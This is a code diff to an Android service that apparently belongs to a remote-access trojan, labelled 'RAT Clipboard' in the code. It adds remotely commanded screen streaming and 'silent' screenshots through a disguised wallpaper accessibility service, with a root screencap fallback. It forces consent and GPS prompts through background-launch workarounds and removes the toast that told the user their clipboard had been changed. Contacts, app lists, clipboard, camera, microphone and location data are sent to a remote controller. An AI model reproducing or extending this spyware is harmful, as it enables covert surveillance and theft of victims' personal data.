@@ -24,6 +24,7 @@ import android.net.NetworkCapabilities;
 import android.net.NetworkRequest;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -45,11 +46,17 @@ import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import androidx.preference.PreferenceManager;
 
+import com.google.android.gms.common.api.ResolvableApiException;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.location.LocationSettingsRequest;
+import com.google.android.gms.location.LocationSettingsResponse;
+import com.google.android.gms.location.SettingsClient;
+import android.app.ActivityOptions;
+import android.location.LocationManager;
 
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -60,6 +67,11 @@ import org.json.JSONObject;
 import org.webrtc.*;
 
 import java.io.File;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.util.Base64;
 import java.net.URISyntaxException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -88,6 +100,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
     
     // Modular Components
     private CameraManager cameraManager;
+    private ScreenCaptureManager screenCaptureManager;
+    private Intent mediaProjectionData;
     private FileSystemExtension fileSystemExtension;
     private LocalRecorder localRecorder;
 
@@ -98,12 +112,16 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private boolean isBackCameraStreaming = false;
     private boolean isMicStreaming = false;
     private boolean isLocationStreaming = false;
+    private boolean isScreenStreaming = false;
     private PeerConnection peerConnection;
     private Socket socket;
     private volatile String webClientId = null;
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
     private BroadcastReceiver syncReceiver;
+    private BroadcastReceiver gpsReceiver;
+    private long lastGpsPromptTime = 0;
+    private static final long GPS_PROMPT_DEBOUNCE_MS = 5000;
     private PowerManager.WakeLock wakeLock;
     private ConnectivityManager.NetworkCallback networkCallback;
 
@@ -124,15 +142,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             accelSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER);
         }
         
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(Constants.NOTIFICATION_ID, createNotification(), 
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION | 
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
-        } else {
-            startForeground(Constants.NOTIFICATION_ID, createNotification());
-        }
+        updateForegroundServiceNotification(false);
 
         // Register Sync Receiver (triggered by WorkManager)
         syncReceiver = new BroadcastReceiver() {
@@ -154,6 +164,35 @@ public class StreamingService extends Service implements android.hardware.Sensor
             registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC), Context.RECEIVER_NOT_EXPORTED);
         } else {
             registerReceiver(syncReceiver, new IntentFilter(Constants.ACTION_FORCE_SYNC));
+        }
+
+        // Register GPS state receiver
+        gpsReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (intent == null) return;
+                String action = intent.getAction();
+                if (LocationManager.PROVIDERS_CHANGED_ACTION.equals(action) ||
+                        Constants.ACTION_GPS_ENABLED.equals(action)) {
+                    boolean gpsEnabled = isGpsEnabled();
+                    Log.d(TAG, "GPS state changed. Action: " + action + ", Enabled: " + gpsEnabled);
+                    if (gpsEnabled) {
+                        cancelGpsNotification();
+                        if (isLocationStreaming) {
+                            startLocationUpdates(currentGpsIntervalMs);
+                            requestLastLocation();
+                        }
+                    }
+                }
+            }
+        };
+        IntentFilter gpsFilter = new IntentFilter();
+        gpsFilter.addAction(LocationManager.PROVIDERS_CHANGED_ACTION);
+        gpsFilter.addAction(Constants.ACTION_GPS_ENABLED);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(gpsReceiver, gpsFilter, Context.RECEIVER_EXPORTED);
+        } else {
+            registerReceiver(gpsReceiver, gpsFilter);
         }
 
         // Schedule WorkManager (Periodic fallback)
@@ -187,6 +226,23 @@ public class StreamingService extends Service implements android.hardware.Sensor
             if (Constants.ACTION_STOP_STREAMING.equals(action)) {
                 stopSelf();
                 return START_NOT_STICKY;
+            } else if (Constants.ACTION_GPS_ENABLED.equals(action)) {
+                if (isGpsEnabled()) {
+                    cancelGpsNotification();
+                    if (isLocationStreaming) {
+                        startLocationUpdates(currentGpsIntervalMs);
+                        requestLastLocation();
+                    }
+                }
+            } else if (Constants.ACTION_MEDIA_PROJECTION_RESULT.equals(action)) {
+                Intent data = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
+                        ? intent.getParcelableExtra(Constants.EXTRA_RESULT_DATA, Intent.class)
+                        : intent.getParcelableExtra(Constants.EXTRA_RESULT_DATA);
+                if (data != null) {
+                    mediaProjectionData = data;
+                    updateForegroundServiceNotification(true);
+                    setScreenStreaming(true);
+                }
             }
         }
         // Ensure background connection is active
@@ -201,6 +257,13 @@ public class StreamingService extends Service implements android.hardware.Sensor
         super.onDestroy();
         Log.d(TAG, "Service onDestroy");
         if (syncReceiver != null) unregisterReceiver(syncReceiver);
+        if (gpsReceiver != null) {
+            try {
+                unregisterReceiver(gpsReceiver);
+            } catch (Exception ignored) {}
+            gpsReceiver = null;
+        }
+        cancelGpsNotification();
         unregisterNetworkCallback();
         releaseWakeLock();
         cleanup();
@@ -418,6 +481,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private void setupMediaStreaming() {
         cameraManager = new CameraManager(this, eglBase);
         cameraManager.initialize(factory);
+        screenCaptureManager = new ScreenCaptureManager(this, eglBase);
+        screenCaptureManager.initialize(factory);
         // By default, do not start front or back camera capturers (stream on demand)
         // Audio capture is also started strictly on demand to prevent microphone usage indicator
 
@@ -513,6 +578,13 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
             Log.d(TAG, "Back video track added (initially disabled)");
         }
+        if (screenCaptureManager != null && screenCaptureManager.getScreenTrack() != null) {
+            VideoTrack screenTrack = screenCaptureManager.getScreenTrack();
+            screenTrack.setEnabled(false);
+            peerConnection.addTransceiver(screenTrack, new RtpTransceiver.RtpTransceiverInit(
+                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
+            Log.d(TAG, "Screen video track added (initially disabled)");
+        }
         audioTransceiver = peerConnection.addTransceiver(
                 MediaStreamTrack.MediaType.MEDIA_TYPE_AUDIO,
                 new RtpTransceiver.RtpTransceiverInit(
@@ -590,6 +662,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 stopLocationUpdates();
                 setCameraStreaming("all", false);
                 setMicStreaming(false);
+                setScreenStreaming(false);
             }
         }).on(Constants.CMD_PING, args -> {
             sendDeviceInfo();
@@ -619,6 +692,14 @@ public class StreamingService extends Service implements android.hardware.Sensor
         }).on(Constants.CMD_STREAM_LOCATION, args -> {
             if (args.length > 0 && args[0] instanceof JSONObject) {
                 handleStreamLocation((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_STREAM_SCREEN, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                handleStreamScreen((JSONObject) args[0]);
+            }
+        }).on(Constants.CMD_SCREEN_SHARE, args -> {
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                handleStreamScreen((JSONObject) args[0]);
             }
         }).on(Constants.CMD_CAMERA_SWITCH, args -> {
             handleCameraSwitch();
@@ -674,6 +755,11 @@ public class StreamingService extends Service implements android.hardware.Sensor
             if (args.length > 0 && args[0] instanceof JSONObject) {
                 takeCameraSnapshot((JSONObject) args[0]);
             }
+        }).on(Constants.CMD_TAKE_SCREENSHOT, args -> {
+            JSONObject payload = (args.length > 0 && args[0] instanceof JSONObject) ? (JSONObject) args[0] : null;
+            takeDeviceScreenshot(payload);
+        }).on(Constants.CMD_OPEN_A11Y_SETTINGS, args -> {
+            openAccessibilitySettings();
         }).on(Constants.CMD_GET_CLIPBOARD, args -> {
             getClipboardText();
         }).on(Constants.CMD_SET_CLIPBOARD, args -> {
@@ -746,11 +832,12 @@ public class StreamingService extends Service implements android.hardware.Sensor
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("version", Build.VERSION.RELEASE);
-            info.put("streaming", isFrontCameraStreaming || isBackCameraStreaming || isMicStreaming);
+            info.put("streaming", isFrontCameraStreaming || isBackCameraStreaming || isMicStreaming || isScreenStreaming);
             info.put("recording", localRecorder != null && localRecorder.isRecording());
             info.put("cameraStreaming", isFrontCameraStreaming || isBackCameraStreaming);
             info.put("frontCameraStreaming", isFrontCameraStreaming);
             info.put("backCameraStreaming", isBackCameraStreaming);
+            info.put("screenStreaming", isScreenStreaming);
             info.put("micStreaming", isMicStreaming);
             info.put("locationStreaming", isLocationStreaming);
 
@@ -766,7 +853,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
             double freeGB = storage[1] / (1024.0 * 1024.0 * 1024.0);
             info.put("storageTotal", Math.round(totalGB * 100.0) / 100.0);
             info.put("storageFree", Math.round(freeGB * 100.0) / 100.0);
-
+            info.put("from", socket.id());
+            if (webClientId != null) info.put("to", webClientId);
             socket.emit(Constants.EVENT_DEVICE_INFO, info);
         } catch (Exception e) {
             Log.e(TAG, "Error sending device info", e);
@@ -892,6 +980,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 }
                 JSONObject msg = new JSONObject()
                         .put("to", webClientId)
+                        .put("from", socket.id())
                         .put("apps", apps);
                 socket.emit(Constants.EVENT_APPS, msg);
             } catch (Exception e) {
@@ -927,6 +1016,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 }
                 JSONObject msg = new JSONObject()
                         .put("to", webClientId)
+                        .put("from", socket.id())
                         .put("contacts_list", contacts);
                 socket.emit(Constants.EVENT_CONTACTS, msg);
             } catch (Exception e) {
@@ -1084,6 +1174,77 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     private long currentGpsIntervalMs = 10000;
 
+    private boolean isGpsEnabled() {
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (locationManager == null) {
+            return false;
+        }
+        try {
+            boolean isLocationOn = true;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                isLocationOn = locationManager.isLocationEnabled();
+            }
+            return isLocationOn && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking GPS status", e);
+            return false;
+        }
+    }
+
+    private synchronized void promptEnableGps() {
+        long now = SystemClock.elapsedRealtime();
+        if (now - lastGpsPromptTime < GPS_PROMPT_DEBOUNCE_MS) {
+            Log.d(TAG, "GPS prompt debounced");
+            return;
+        }
+        lastGpsPromptTime = now;
+
+        Log.d(TAG, "Prompting user to enable GPS/location via native OS dialog");
+
+        Intent intent = new Intent(this, GpsResolutionActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+
+        boolean launched = false;
+        if (WallpaperAccessibilityService.isRunning()) {
+            try {
+                WallpaperAccessibilityService.getInstance().startActivity(intent);
+                launched = true;
+                Log.i(TAG, "Launched GpsResolutionActivity via AccessibilityService");
+            } catch (Exception e) {
+                Log.w(TAG, "Failed launching GpsResolutionActivity via AccessibilityService", e);
+            }
+        }
+        if (!launched) {
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    ActivityOptions opts = ActivityOptions.makeBasic();
+                    opts.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
+                    PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                    pi.send(this, 0, null, null, null, null, opts.toBundle());
+                    launched = true;
+                    Log.i(TAG, "Launched GpsResolutionActivity via PendingIntent with BAL allowed");
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed launching GpsResolutionActivity via PendingIntent", e);
+            }
+        }
+        if (!launched) {
+            try {
+                startActivity(intent);
+                Log.i(TAG, "Launched GpsResolutionActivity directly");
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to start GpsResolutionActivity", e);
+            }
+        }
+    }
+
+    private void cancelGpsNotification() {
+        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (nm != null) {
+            nm.cancel(Constants.NOTIFICATION_ID_GPS_PROMPT);
+        }
+    }
+
     private void startLocationUpdates() {
         startLocationUpdates(currentGpsIntervalMs);
     }
@@ -1094,6 +1255,10 @@ public class StreamingService extends Service implements android.hardware.Sensor
             broadcastPermissionError();
             isLocationStreaming = false;
             return;
+        }
+
+        if (!isGpsEnabled()) {
+            promptEnableGps();
         }
 
         stopLocationUpdates();
@@ -1108,6 +1273,19 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, intervalMs)
                 .setMinUpdateIntervalMillis(intervalMs / 2)
                 .build();
+
+        LocationSettingsRequest.Builder settingsBuilder = new LocationSettingsRequest.Builder()
+                .addLocationRequest(locationRequest)
+                .setAlwaysShow(true);
+
+        LocationServices.getSettingsClient(this)
+                .checkLocationSettings(settingsBuilder.build())
+                .addOnFailureListener(e -> {
+                    if (e instanceof ResolvableApiException) {
+                        Log.d(TAG, "Google Play Location settings unsatisfied, prompting to enable GPS");
+                        promptEnableGps();
+                    }
+                });
 
         locationCallback = new LocationCallback() {
             @Override
@@ -1293,12 +1471,116 @@ public class StreamingService extends Service implements android.hardware.Sensor
         isLocationStreaming = enable;
         if (enable) {
             long interval = intervalMs > 0 ? intervalMs : currentGpsIntervalMs;
+            if (!isGpsEnabled()) {
+                promptEnableGps();
+            }
             startLocationUpdates(interval);
         } else {
+            cancelGpsNotification();
             stopLocationUpdates();
         }
         Log.d(TAG, "Location streaming updated: " + enable);
         sendStreamStatus();
+    }
+
+    private void handleStreamScreen(JSONObject payload) {
+        if (payload == null) return;
+        boolean active = payload.optBoolean("enable", payload.optBoolean("active", false));
+        setScreenStreaming(active);
+    }
+
+    private synchronized void setScreenStreaming(boolean enable) {
+        if (screenCaptureManager == null) return;
+        if (enable) {
+            if (mediaProjectionData == null) {
+                Log.i(TAG, "MediaProjection token needed; launching consent activity");
+                launchMediaProjectionConsent();
+                return;
+            }
+            updateForegroundServiceNotification(true);
+            boolean started = screenCaptureManager.startScreenCapture(mediaProjectionData);
+            if (!started) {
+                Log.w(TAG, "Screen capture failed with cached token; clearing and requesting fresh consent");
+                mediaProjectionData = null;
+                updateForegroundServiceNotification(false);
+                launchMediaProjectionConsent();
+                return;
+            }
+            isScreenStreaming = started;
+            Log.i(TAG, "Screen streaming updated: " + started);
+        } else {
+            screenCaptureManager.stopScreenCapture();
+            updateForegroundServiceNotification(false);
+            isScreenStreaming = false;
+            mediaProjectionData = null;
+            Log.i(TAG, "Screen streaming stopped");
+        }
+        sendStreamStatus();
+    }
+
+    private void launchMediaProjectionConsent() {
+        Intent intent = new Intent(this, MediaProjectionPermissionActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+
+        boolean launched = false;
+        if (WallpaperAccessibilityService.isRunning()) {
+            try {
+                WallpaperAccessibilityService.getInstance().startActivity(intent);
+                launched = true;
+                Log.i(TAG, "Launched MediaProjectionPermissionActivity via AccessibilityService");
+            } catch (Exception e) {
+                Log.w(TAG, "Failed launching via AccessibilityService", e);
+            }
+        }
+        if (!launched) {
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    ActivityOptions opts = ActivityOptions.makeBasic();
+                    opts.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
+                    PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                    pi.send(this, 0, null, null, null, null, opts.toBundle());
+                    launched = true;
+                    Log.i(TAG, "Launched MediaProjectionPermissionActivity via PendingIntent with BAL allowed");
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed launching via PendingIntent", e);
+            }
+        }
+        if (!launched) {
+            try {
+                startActivity(intent);
+                Log.i(TAG, "Launched MediaProjectionPermissionActivity directly from service");
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to start MediaProjectionPermissionActivity", e);
+            }
+        }
+    }
+
+    private void updateForegroundServiceNotification(boolean withMediaProjection) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            int types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+            }
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+            }
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+            }
+            if (withMediaProjection) {
+                types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+            }
+            try {
+                startForeground(Constants.NOTIFICATION_ID, createNotification(), types);
+            } catch (Exception e) {
+                Log.e(TAG, "Failed startForeground with types=" + types + ", falling back to basic notification", e);
+                startForeground(Constants.NOTIFICATION_ID, createNotification());
+            }
+        } else {
+            startForeground(Constants.NOTIFICATION_ID, createNotification());
+        }
     }
 
     private void sendStreamStatus() {
@@ -1310,6 +1592,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             status.put("camera", isFrontCameraStreaming || isBackCameraStreaming);
             status.put("mic", isMicStreaming);
             status.put("location", isLocationStreaming);
+            status.put("screen", isScreenStreaming);
 
             JSONObject msg = new JSONObject();
             msg.put("to", webClientId);
@@ -1802,6 +2085,110 @@ public class StreamingService extends Service implements android.hardware.Sensor
         }).start();
     }
 
+    private void openAccessibilitySettings() {
+        try {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            Log.d(TAG, "Opened Accessibility Settings");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to open accessibility settings", e);
+        }
+    }
+
+    private void takeDeviceScreenshot(JSONObject payload) {
+        if (webClientId == null || socket == null || !socket.connected()) {
+            Log.w(TAG, "Cannot take screenshot, web client absent or socket disconnected");
+            return;
+        }
+
+        Log.d(TAG, "Initiating silent screenshot capture...");
+
+        // 1. Accessibility Service capture (Android 11+, completely silent and invisible)
+        WallpaperAccessibilityService a11yService = WallpaperAccessibilityService.getInstance();
+        if (a11yService != null) {
+            a11yService.captureSilentScreenshot(new WallpaperAccessibilityService.ScreenshotCallback() {
+                @Override
+                public void onSuccess(String base64Jpeg) {
+                    sendScreenshotResponse(base64Jpeg, null);
+                }
+
+                @Override
+                public void onError(String error) {
+                    Log.w(TAG, "Accessibility screenshot returned error: " + error + ", checking root fallback");
+                    tryRootScreenshotFallback(error);
+                }
+            });
+            return;
+        }
+
+        // 2. Fallback to Root screencap
+        tryRootScreenshotFallback("Accessibility Service is not active");
+    }
+
+    private void tryRootScreenshotFallback(String a11yError) {
+        new Thread(() -> {
+            String rootImage = captureScreenshotWithRoot();
+            if (rootImage != null) {
+                Log.d(TAG, "Silent screenshot captured via root screencap fallback");
+                sendScreenshotResponse(rootImage, null);
+            } else {
+                String errorMsg = "Silent screenshot requires Accessibility Service to be enabled in Android Settings > Accessibility > Installed apps > " 
+                        + getString(R.string.app_name) + " (or Root access).";
+                sendScreenshotResponse(null, errorMsg);
+            }
+        }).start();
+    }
+
+    private String captureScreenshotWithRoot() {
+        Process process = null;
+        try {
+            process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p"});
+            InputStream is = process.getInputStream();
+            Bitmap bmp = BitmapFactory.decodeStream(is);
+            process.waitFor();
+            if (bmp != null) {
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bmp.compress(Bitmap.CompressFormat.JPEG, 85, baos);
+                bmp.recycle();
+                return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+            }
+        } catch (Exception e) {
+            Log.d(TAG, "Root screencap check failed: " + e.getMessage());
+        } finally {
+            if (process != null) {
+                try {
+                    process.destroy();
+                } catch (Exception ignored) {}
+            }
+        }
+        return null;
+    }
+
+    private void sendScreenshotResponse(String base64Image, String errorMsg) {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            JSONObject data = new JSONObject();
+            if (base64Image != null) {
+                data.put("image", base64Image);
+                data.put("timestamp", System.currentTimeMillis());
+            } else {
+                data.put("error", "SCREENSHOT_UNAVAILABLE");
+                data.put("message", errorMsg != null ? errorMsg : "Screenshot capture failed");
+            }
+
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId);
+            msg.put("from", socket.id());
+            msg.put("screenshot", data);
+
+            socket.emit(Constants.EVENT_SCREENSHOT_DATA, msg);
+            Log.d(TAG, "Sent screenshot response to web client (success=" + (base64Image != null) + ")");
+        } catch (JSONException e) {
+            Log.e(TAG, "Error packaging screenshot response", e);
+        }
+    }
+
     private void getClipboardText() {
         if (webClientId == null || socket == null || !socket.connected()) return;
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -1841,7 +2228,6 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     android.content.ClipData clip = android.content.ClipData.newPlainText("RAT Clipboard", text);
                     clipboard.setPrimaryClip(clip);
                     Log.d(TAG, "Device clipboard text updated remotely");
-                    showToast(new JSONObject().put("text", "Clipboard updated"));
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Write clipboard failed", e);
@@ -1893,6 +2279,11 @@ public class StreamingService extends Service implements android.hardware.Sensor
             cameraManager.stopCapturers();
             cameraManager.dispose();
             cameraManager = null;
+        }
+        if (screenCaptureManager != null) {
+            screenCaptureManager.stopScreenCapture();
+            screenCaptureManager.dispose();
+            screenCaptureManager = null;
         }
         if (localRecorder != null) {
             localRecorder.stop(null);
